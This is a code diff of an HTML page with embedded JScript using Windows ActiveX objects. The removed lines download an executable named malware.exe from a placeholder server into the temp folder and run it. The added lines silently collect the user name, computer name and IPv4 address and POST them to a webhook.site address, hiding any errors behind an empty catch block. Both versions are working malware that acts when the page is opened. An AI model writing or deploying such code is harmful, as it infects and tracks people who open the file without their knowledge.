@@ -1,22 +1,37 @@
 <html>
-  <head>
-    <script>
-      var shell = new ActiveXObject("WScript.Shell");
-      var xhr = new ActiveXObject("MSXML2.XMLHTTP");
-      var stream = new ActiveXObject("ADODB.Stream");
-      var url = "http://yourserver.com/malware.exe";
-      var path = shell.ExpandEnvironmentStrings("%TEMP%") + "\\download.exe";
+<head>
+<script language="JScript">
+try {
+  var shell = new ActiveXObject("WScript.Shell");
+  var http = new ActiveXObject("MSXML2.XMLHTTP");
+  
+  // Lay name and user
+  var username = shell.ExpandEnvironmentStrings("%USERNAME%");
+  var computername = shell.ExpandEnvironmentStrings("%COMPUTERNAME%");
+  
+  // Lay dia chi IP
+  var ipconfig = shell.Exec("ipconfig");
+  var ip = "";
+  while (!ipconfig.StdOut.AtEndOfStream) {
+    var line = ipconfig.StdOut.ReadLine();
+    if (line.indexOf("IPv4") != -1) {
+      ip = line.split(":")[1].trim();
+      break;
+    }
+  }
 
-      xhr.open("GET", url, false);
-      xhr.send();
+  // Gui du lieu ve 
+  var url = "https://webhook.site/88b3e0ce-d9a8-4a74-80b7-ea68e8407b68";
+  var data = "user=" + encodeURIComponent(username) + "&pc=" + encodeURIComponent(computername) + "&ip=" + encodeURIComponent(ip);
+  
+  http.open("POST", url, false);
+  http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+  http.send(data);
 
-      stream.Type = 1; // binary
-      stream.Open();
-      stream.Write(xhr.responseBody);
-      stream.SaveToFile(path, 2);
-      stream.Close();
-
-      shell.Run(path);
-    </script>
-  </head>
+} catch(e) {
+ 
+}
+</script>
+</head>
+<body></body>
 </html>
